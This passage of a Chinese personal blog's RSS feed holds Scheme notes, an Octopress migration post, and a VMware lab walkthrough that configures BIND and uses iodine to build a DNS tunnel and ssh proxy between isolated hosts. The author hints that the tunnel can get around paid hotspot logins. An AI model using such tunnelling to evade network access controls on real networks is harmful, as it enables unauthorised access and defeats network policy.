&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cddr&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt; 以 &lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="err"&gt; 结尾 &lt;/span&gt;
&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cons&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;#f&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cons&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;#f&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;cdr&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt; 把 &lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="err"&gt; 的 &lt;/span&gt;&lt;span class="n"&gt;cdr&lt;/span&gt;&lt;span class="err"&gt; 设为 &lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="err"&gt;，使 &lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="err"&gt; 变成 &lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt; 变成了 &lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;
&lt;span class="cp"&gt;#t&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cons&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;#t&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id="2-pair"&gt;2. pair 的显示规则 &lt;/h3&gt;
&lt;p&gt; 引用 &lt;a href="http://download.plt-scheme.org/doc/html/guide/Pairs__Lists__and_Scheme_Syntax.html"&gt; 这里 &lt;/a&gt; 的解释：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In general, the rule for printing a pair is as follows: use the dot notation always, but if the dot is immediately followed by an open parenthesis, then remove the dot, the open parenthesis, and the    matching close parenthesis. Thus, (0 . (1 . 2)) becomes (0 1 . 2), and (1 . (2 . (3 . ()))) becomes (1 2 3).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; 大意就是，如果 pair 的 “ 点 ” 紧接着小括号，则这个点和小括号都可以去掉。&lt;/p&gt;
&lt;p&gt; 所以 (a.(b.c)) 等价于 (a b.c), (a.(b.(c.()))) 等价于 (a b c)。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Tue, 25 Sep 2012 22:41:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-09-25:blog/2012/09/25/schemeli-mian-de-pairhe-list/</guid><category>lisp</category><category>scheme</category></item><item><title>从Wordpress转到Octopress</title><link>http://www.goorockey.com/blog/2012/09/09/cong-wordpresszhuan-dao-octopress/</link><description>&lt;p&gt;[TOC]
想尝试 &lt;a href="http://octopress.org"&gt;Octopress&lt;/a&gt; 很久了。&lt;/p&gt;
&lt;p&gt;&lt;a href="http://octopress.org"&gt;Octopress&lt;/a&gt; 自称为 A blogging framework for &lt;strong&gt;hackers&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 玩 &lt;a href="http://octopress.org"&gt;Octopress&lt;/a&gt; 主要会涉及到以下技术 :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;git &lt;/li&gt;
&lt;li&gt;ruby&lt;/li&gt;
&lt;li&gt;markdown&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 这些技术对我来说还是很陌生，也好借此机会熟悉熟悉～&lt;/p&gt;
&lt;p&gt; 总的来说，[Octopress］想对于 Wordpress 的优势有 :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 静态页面，速度快 &lt;/li&gt;
&lt;li&gt; 分布式存储，保证数据的安全。而且即使不能上网，也能本地写博客和预览 &lt;/li&gt;
&lt;li&gt; 支持用 markdown（当然 wordpress 也有 markdown 的插件 , 但 Octopress 在命令行写博客更 cool)&lt;/li&gt;
&lt;/ul&gt;
&lt;!--more--&gt;

&lt;p&gt; 仿照着，写了个友情链接侧栏的插件 , 当然直接在 source/_include/asides/ 写静态页面也可以，纯练手 :&lt;/p&gt;
&lt;p&gt;&lt;script src="https://gist.github.com/goorockey/3689183.js"&gt;&lt;/script&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Sun, 09 Sep 2012 20:53:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-09-09:blog/2012/09/09/cong-wordpresszhuan-dao-octopress/</guid><category>blog</category><category>wordpress</category><category>octopress</category></item><item><title>用VMWare组网，实验DNS隧道</title><link>http://www.goorockey.com/blog/2012/03/15/yong-vmwarezu-wang-shi-yan-dnssui-dao/</link><description>
&lt;p&gt; 继续用 VMWare 来组网，这次要测试我想试很久的 DNS 隧道，之前碍于没有找到有独立 ip 的方法（当然是要免费的 ~~），现在用 VMWare 就可以了。&lt;/p&gt;
&lt;p&gt;DNS 隧道是什么就不解释了。google 一下 DNS 隧道能搜到风河、云风两个大牛相关的 blog。这次我用 iodine 来实现 DNS 隧道。&lt;/p&gt;
&lt;h2 id="_1"&gt; 场景 &lt;/h2&gt;
&lt;p&gt; 现在情况是，用户只能跟外界有 DNS 通路，想借此进行平常的 http、ftp 等通信。&lt;/p&gt;
&lt;p&gt; 据说平常的 CMCC 等开放热点，虽然 http 等要账号和密码，但 DNS 是通的，然后你懂的了。&lt;/p&gt;
&lt;p&gt; 简单的拓扑图如下：&lt;/p&gt;
&lt;p&gt;&lt;img alt=" 拓扑图 " src="http://www.goorockey.com/uploads/2012/03/image_thumb2.png"/&gt;&lt;/p&gt;
&lt;p&gt; 整个回路就是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 用户把要想跟外网进行通信的数据包用 DNS 协议封装 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 得到的 DNS 包发送给 DNS 服务器，要求做 DNS 解析 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS 服务器根据域名，解析出 DNS 代理的 ip，并把数据包发给它 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS 代理把数据包解封，并转发给外网的目标地址 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 外网回复的数据包原路返回，这样就完成通讯了。
 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="vmware"&gt;VMWare 环境模拟 &lt;/h2&gt;
&lt;p&gt; 这次我用了三台机子，系统还是 CentOS 6.0：&lt;/p&gt;
&lt;p&gt; 主机名 角色 网卡 ip&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;HostA&lt;/span&gt;&lt;span class="err"&gt;  &lt;/span&gt; &lt;span class="err"&gt; 用户 &lt;/span&gt; &lt;span class="mf"&gt;192.168.149.128&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;only&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;HostB&lt;/span&gt;&lt;span class="err"&gt;  &lt;/span&gt; &lt;span class="n"&gt;DNS&lt;/span&gt;&lt;span class="err"&gt; 代理 &lt;/span&gt; &lt;span class="mf"&gt;192.168.126.130&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NAT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;HostC&lt;/span&gt;&lt;span class="err"&gt;  &lt;/span&gt; &lt;span class="n"&gt;DNS&lt;/span&gt;&lt;span class="err"&gt; 服务器 &lt;/span&gt; &lt;span class="mf"&gt;192.168.149.130&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;only&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;、&lt;/span&gt;&lt;span class="mf"&gt;192.168.126.233&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NAT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 要模拟的初始状态就是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;HostA&lt;/span&gt;&lt;span class="err"&gt;（用户）可以跟 &lt;/span&gt;&lt;span class="n"&gt;HostC&lt;/span&gt;&lt;span class="err"&gt; 做 &lt;/span&gt;&lt;span class="n"&gt;DNS&lt;/span&gt;&lt;span class="err"&gt; 解析，但不能访问外网 &lt;/span&gt; &lt;span class="err"&gt;。    &lt;/span&gt; &lt;span class="err"&gt;（所以虚拟网卡用 &lt;/span&gt;&lt;span class="n"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;only&lt;/span&gt;&lt;span class="err"&gt; 模式）&lt;/span&gt;
&lt;span class="n"&gt;HostB&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="n"&gt;DNS&lt;/span&gt;&lt;span class="err"&gt; 代理）可以跟外网通信。           &lt;/span&gt; &lt;span class="err"&gt;（用 &lt;/span&gt;&lt;span class="n"&gt;NAT&lt;/span&gt;&lt;span class="err"&gt; 和 &lt;/span&gt;&lt;span class="n"&gt;Bridged&lt;/span&gt;&lt;span class="err"&gt; 都可以，这次我选用 &lt;/span&gt;&lt;span class="n"&gt;NAT&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;
&lt;span class="n"&gt;HostC&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="n"&gt;DNS&lt;/span&gt;&lt;span class="err"&gt; 服务器）可以跟 &lt;/span&gt;&lt;span class="n"&gt;HostA&lt;/span&gt;&lt;span class="err"&gt; 进行 &lt;/span&gt;&lt;span class="n"&gt;DNS&lt;/span&gt;&lt;span class="err"&gt; 解析，且能跟 &lt;/span&gt;&lt;span class="n"&gt;HostB&lt;/span&gt;&lt;span class="err"&gt; 通信。  &lt;/span&gt; &lt;span class="err"&gt;（所以用两张网卡，为了分别跟 &lt;/span&gt;&lt;span class="n"&gt;HostA&lt;/span&gt;&lt;span class="err"&gt; 和 &lt;/span&gt;&lt;span class="n"&gt;HostB&lt;/span&gt;&lt;span class="err"&gt; 通信）&lt;/span&gt;
&lt;span class="n"&gt;HostA&lt;/span&gt;&lt;span class="err"&gt; 的 &lt;/span&gt;&lt;span class="n"&gt;iptables&lt;/span&gt;&lt;span class="err"&gt; 不允许 &lt;/span&gt;&lt;span class="n"&gt;HostA&lt;/span&gt;&lt;span class="err"&gt; 和 &lt;/span&gt;&lt;span class="n"&gt;HostB&lt;/span&gt;&lt;span class="err"&gt; 之间互访 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id="dns"&gt;DNS 服务器配置 &lt;/h2&gt;
&lt;p&gt; 刚开始看教程好像很繁琐，感觉 conf 文件好多啊，而且配置项也多 ~~&lt;/p&gt;
&lt;p&gt; 静下心来看，其实要实现最基本的的 DNS 解析很简单，主要就是修改两个文件。&lt;/p&gt;
&lt;p&gt;1. 安装 &lt;/p&gt;
&lt;p&gt; 需要在 HostC 执行以下命令，安装 DNS 服务器所需的 bind 和 caching-nameserver：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;yum&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="n"&gt;bind&lt;/span&gt; &lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;utils&lt;/span&gt; &lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;chroot&lt;/span&gt; &lt;span class="n"&gt;caching&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;nameserver&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;2. 修改 named 的 conf 文件（/etc/named.conf）&lt;/p&gt;
&lt;p&gt; 添加域名 goorockey.go 域名的配置：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;zone&lt;/span&gt; &lt;span class="err"&gt;“&lt;/span&gt;&lt;span class="n"&gt;goorockey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;go&lt;/span&gt;&lt;span class="err"&gt;”&lt;/span&gt; &lt;span class="n"&gt;IN&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="err"&gt;  &lt;/span&gt; &lt;span class="n"&gt;master&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="err"&gt;     &lt;/span&gt; &lt;span class="err"&gt;“&lt;/span&gt;&lt;span class="n"&gt;goorockey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;go&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zone&lt;/span&gt;&lt;span class="err"&gt;”&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;allow&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;none&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 大概解释：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;zone “ goorockey.go”： 指示要添加 goorockey.go 这个域名的正向解析。正向解析就是指域名到 ip 的解析，反向解析是指 ip 到域名的解析。例如想通过查询 DNS 服务器，知道 192.168.0.1 判定了多少域名，则在 DNS 服务器上配置 zone “1.0.168.192.in-addr-arpa” 的项。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;type master：对于 goorockey.go 这个域名，当前 DNS 服务器是它的主 DNS 服务器。type 可以还可以使 hint 和 slave。只有 zone “.” 可以配置 type hint。type slave 是指对于这个域名，当前 DNS 服务器是辅助 DNS 服务器，即它的 DNS 记录是从主服务器拷贝过来的，目的是为了达到 DNS 解析的分布式、负载均衡。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;file “goorockey.go.zone”：这个域名的 DNS 记录文件在 goorockey.go.zone，文件所在目录在 /etc/named.conf 的 options 项中的 directory 来定义。默认是 /var/named&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;allow-update：定义时候允许更新 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 要注意的是，/etc/named.conf 中的 options 项是所有域名的全局配置。默认时，有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;allow-query   {   localhost;   };&lt;/code&gt; 意思是只允许本机做 DNS 查询，当然要把它注释掉。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;listen-port    53    {  127.0.0.1;   };&lt;/code&gt; 意思是服务端口为 53，但监听的 ip 是 127.0.0.1，这样就不能让别的机子访问 DNS 解析服务了。所以可以把这句话注释掉，或者把 ip 改为 0.0.0.0 或指定 ip。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3. 编辑 goorockey.go 的 DNS 记录文件 &lt;/p&gt;
&lt;p&gt; 根据我们在 /etc/named.conf 的配置，文件是 /var/named/goorockey.go.zone。&lt;/p&gt;
&lt;p&gt; 创建此文件，并编辑内容为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;@ &lt;/span&gt; &lt;span class="n"&gt;IN&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="n"&gt;SOA&lt;/span&gt; &lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;20120315&lt;/span&gt; &lt;span class="mi"&gt;3600&lt;/span&gt; &lt;span class="mi"&gt;1800&lt;/span&gt; &lt;span class="mi"&gt;36000&lt;/span&gt; &lt;span class="mi"&gt;3600&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="err"&gt;  &lt;/span&gt; &lt;span class="n"&gt;IN&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="n"&gt;NS&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;goorockey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;go&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="n"&gt;IN&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.126.130&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 大概解释：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 第一行是一条 SOA 记录。@ 指代当前域名，就是 /etc/named 中的 goorockey.go。SOA 记录是域名有效性的相关属性。localhost. 是主服务器的地址。root.localhost. 是邮箱。主要 DNS 记录文件的地址都用 FQDN，每个地址最后的句号 “.” 表示结束。如果没有句号 “.”，会自动追加域名，例如没有句号的 localhost 会解释成 ”localhost.goorockey.go“。后面就是具体属性项。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 第二行开始是两个空格，第一个空格表示继续上一条的内容，这里指 ”@“，第二个空格就是分割 @ 和 IN 的。这一行表示域名 goorockey.go 的域名服务器是本机。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 第三行是一条 A 记录，A for address。意思就是域名 goorockey.go 会解析成 ip 192.168.126.130。可以看出，搞这么久，就是为了找到这句话。所以说 A 记录是 DNS 服务器的核心，就是它标明 DNS 解析的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;DNS 记录类型还会有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;PTR 用在反向解析 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MX 用在邮件服务器 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TXT 就是纯文本，对 DNS 服务器做标注 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4. 运行 DNS 服务 &lt;/p&gt;
&lt;p&gt; 在 HostC 执行： &lt;code&gt;$ service  named   start&lt;/code&gt; 或者 &lt;code&gt;$ /etc/init.d/named start&lt;/code&gt;, 这就可以运行 DNS 服务了。&lt;/p&gt;
&lt;p&gt; 对 HostC 的 /etc/resolv.conf 添加 &lt;code&gt;nameserver 127.0.0.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; 则在 HostC 用 nslookup 能成功返回 DNS 信息：&lt;/p&gt;
&lt;p&gt;&lt;img alt="DNS 信息 " src="http://www.goorockey.com/uploads/2012/03/20594453_thumb.png"/&gt;&lt;/p&gt;
&lt;p&gt; 但还要配置 iptables，使其他机子可以访问 DNS 服务的端口。&lt;/p&gt;
&lt;p&gt; 对于默认的 53 端口，在 HostC 运行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="n"&gt;INPUT&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dport&lt;/span&gt; &lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="n"&gt;ACCEPT&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="n"&gt;INPUT&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;udp&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dport&lt;/span&gt; &lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="n"&gt;ACCEPT&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 要解释一下的是，DNS 包有可能以 tcp 或者 udp 方式传输。一般首选是 udp 方式。但因为 udp 包长度只能是 512 字节，也不能分包，所以如果当 DNS 包长度大于 512 时，就会选择 tcp 方式。所以这里要对 tcp 和 udp 都设置 ACCEPT。&lt;/p&gt;
&lt;p&gt; 在 HostA 和 HostB 的 /etc/resolv.conf 添加 HostA 的 ip 后，就能正确解析 goorockey.go 了。&lt;/p&gt;
&lt;h2 id="iodine"&gt;iodine&lt;/h2&gt;
&lt;p&gt;iodine 是外国人写的开源 DNS 隧道工具，有 linux 版、windows 版和 Mac 版的。教程看它的 ReadMe 或者 HowToSetup 都比较清楚。&lt;/p&gt;
&lt;p&gt; 下载并安装对应自己版本的 iodine 后就能使用了。&lt;/p&gt;
&lt;p&gt; 在 DNS 隧道的服务器端 (HostB)，先执行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iodined&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="mf"&gt;10.0.0.1&lt;/span&gt; &lt;span class="n"&gt;goorockey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;go&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 输入密码后，服务端就运行了。注意服务端运行的是 iodined，有 ”d“。&lt;/p&gt;
&lt;p&gt; 在客户端（HostA)，执行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;iodine&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.168.126.130&lt;/span&gt; &lt;span class="n"&gt;goorockey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;go&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 其中 192.168.126.130 是服务端（HostB）的 ip。&lt;/p&gt;
&lt;p&gt; 然后还要配置一下，HostA，HostB，HostC 的 iptables，使它们的 DNS 包可以通过就可以了。&lt;/p&gt;
&lt;p&gt; 这时候，HostA 的虚拟网卡 ip 是 10.0.0.2，HostB 的虚拟网卡 ip 是 10.0.0.1。两台机子已经建立了 VPN。&lt;/p&gt;
&lt;p&gt; 本来两台不能互访的机子就可以访问了。&lt;/p&gt;
&lt;p&gt; 例如在 HostA 就可以 ssh HostB 了 ：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="mf"&gt;10.0.0.1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 然后就可以用 ssh 隧道过去来做代理了 ~~&lt;/p&gt;
&lt;h2 id="_2"&gt; 小结 &lt;/h2&gt;
&lt;p&gt; 那时候看到 DNS 隧道，真是非常的兴奋，感觉太爽、太妙了。其实协议都可以这样做隧道，只是那时候没有意识到而已。&lt;/p&gt;
&lt;p&gt; 之后还继续想实验一下 ICMP 隧道，看一下 iodine 的代码。O(∩_∩)O 哈哈 ~&lt;/p&gt;
&lt;h2 id="_3"&gt; 参考资料：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;【风河的博文】&lt;a href="http://www.nsbeta.info/archives/96"&gt;http://www.nsbeta.info/archives/96&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【云风的博文】&lt;a href="http://blog.codingnow.com/2011/06/dns_tunnel.html"&gt;http://blog.codingnow.com/2011/06/dns_tunnel.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【iodine】&lt;a href="http://code.kryo.se/iodine/"&gt;http://code.kryo.se/iodine/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Thu, 15 Mar 2012 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-03-15:blog/2012/03/15/yong-vmwarezu-wang-shi-yan-dnssui-dao/</guid><category>network</category><category>vmware</category><category>隧道</category></item><item><title>VMWare组网实验(NAT)</title><link>http://www.goorockey.com/blog/2012/03/13/vmwarezu-wang-shi-yan-nat/</link><description>
&lt;p&gt; 本着 “ 干中学 ” 的精神，看完资料，还是用 VMWare 来练习一下使用 NAT，好加深认识。&lt;/p&gt;
&lt;p&gt; 实验涉及：NAT，iptables，&lt;/p&gt;
&lt;h2 id="_1"&gt; 实验目标 &lt;/h2&gt;
&lt;p&gt; 这次我要用 iptables 实现 NAT 功能（SNAT 和 DNAT）。&lt;/p&gt;
&lt;p&gt; 先上拓扑图（可能有点不规范）：&lt;/p&gt;
